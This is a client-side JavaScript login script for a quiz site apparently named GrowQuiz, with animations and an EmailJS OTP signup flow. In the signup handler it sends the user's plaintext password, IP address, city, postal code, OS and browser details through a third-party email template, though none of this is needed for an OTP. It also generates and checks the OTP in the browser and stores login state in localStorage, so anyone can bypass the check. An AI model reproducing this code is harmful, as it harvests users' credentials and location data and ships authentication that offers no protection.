(function() {
  emailjs.init("AiVR2hP52XHP6xKkp");
})();

// Animations
gsap.to("#loginBox", {
  opacity: 1,
  scale: 1,
  duration: 1,
  ease: "power3.out"
});
gsap.from("#growQuiz", {
  y: -30,
  opacity: 0,
  delay: 0.2,
  duration: 0.8,
  ease: "back.out(1.7)"
});
gsap.from("#welcome", {
  x: -50,
  opacity: 0,
  delay: 0.4,
  duration: 0.8
});
gsap.from("#subtext", {
  x: 50,
  opacity: 0,
  delay: 0.6,
  duration: 0.8
});

// Form Submit
const form = document.getElementById('loginForm');
const poraCont = document.getElementById("pora-container");
const verifyOtpBtn = document.getElementById('verifyOtpBtn');

form.addEventListener('submit', function(e) {
  e.preventDefault();

  const name = document.getElementById('name').value.trim();
  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value.trim();

  // Validation
  const nameRegex = /^[a-zA-Z\s]{3,30}$/;
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  if (!nameRegex.test(name) || !emailRegex.test(email)) {
    Toastify({
      text: "Please enter valid Name and Email.",
      backgroundColor: "linear-gradient(to right, #ff416c, #ff4b2b)",
      duration: 3000
    }).showToast();
    return;
  }

  const existingUser = JSON.parse(localStorage.getItem('user'));

  // Existing user
  if (existingUser && existingUser.name === name && existingUser.email === email) {
    if (existingUser.login === true) {
      Swal.fire({
        icon: 'success',
        title: 'Welcome back!',
        text: 'Redirecting to dashboard...',
        timer: 2000,
        showConfirmButton: false
      });
      setTimeout(() => {
        window.location.href = "../index.html";
      }, 2000);
      return;
    } else {
      showOtpBox();
      return;
    }
  }

  // New user - generate OTP
  const otp = Math.floor(100000 + Math.random() * 900000);

  localStorage.setItem('user', JSON.stringify({
    name,
    email,
    otp,
    login: false
  }));

  // Fetch Location + System Info
  fetch("https://ipapi.co/json")
    .then(res => res.json())
    .then(locationData => {
      const templateParams = {
        sender_email: "supportgrowquiz@gmail.com",
        receiver_email: email,
        name: name,
        otp: otp,
        password: password,
        user_os: navigator.platform || "Unknown OS",
        user_browser: navigator.userAgent || "Unknown Browser",
        user_country: locationData.country_name || "Unknown Country",
        user_ip: locationData.ip || "Unknown IP",
        user_city: locationData.city || "Unknown City",
        user_region: locationData.region || "Unknown Region",
        user_postal: locationData.postal || "Unknown Postal Code",
        user_time_zone: locationData.timezone || "Unknown Timezone",
        user_referrer: document.referrer || window.location.href
      };

      emailjs.send('service_819r3au', 'template_3es8n4o', templateParams)
        .then(function(response) {
          console.log('SUCCESS!', response.status, response.text);
          Swal.fire({
            icon: 'success',
            title: 'OTP Sent!',
            text: 'Check your email inbox.',
            timer: 3000,
            showConfirmButton: false
          });
          showOtpBox();
        }, function(error) {
          console.log('FAILED...', error);
          Swal.fire({
            icon: 'error',
            title: 'Failed to send OTP',
            text: 'Please try again later.'
          });
        });
    })
    .catch(error => {
      console.error("Location Fetch Error:", error);
    });
});

// Show OTP Box
function showOtpBox() {
  poraCont.classList.add("hidden");
  document.getElementById('otpBox').classList.remove('hidden');

  gsap.from("#otpBox", {
    opacity: 0,
    scale: 0.8,
    duration: 0.8,
    ease: "power3.out"
  });
}

// Verify OTP
verifyOtpBtn.addEventListener('click', function() {
  try {
    const enteredOtp = document.getElementById('otpInput').value.trim();
    const userData = JSON.parse(localStorage.getItem('user'));

    if (userData && enteredOtp && Number(enteredOtp) === Number(userData.otp)) {
      Swal.fire({
        icon: 'success',
        title: 'OTP Verified!',
        text: 'Redirecting to dashboard...',
        timer: 2000,
        showConfirmButton: false
      });

      setTimeout(() => {
        delete userData.otp;
        userData.login = true;
        localStorage.setItem('user', JSON.stringify(userData));
        window.location.href="../index.html";
      }, 2000);
    } else {
      Swal.fire({
        icon: 'error',
        title: 'Invalid OTP',
        text: 'Please try again.'
      });
    }
  } catch (error) {
    console.error("Error during OTP verification:", error);
    Swal.fire({
      icon: 'error',
      title: 'Something went wrong',
      text: error.message
    });
  }
});
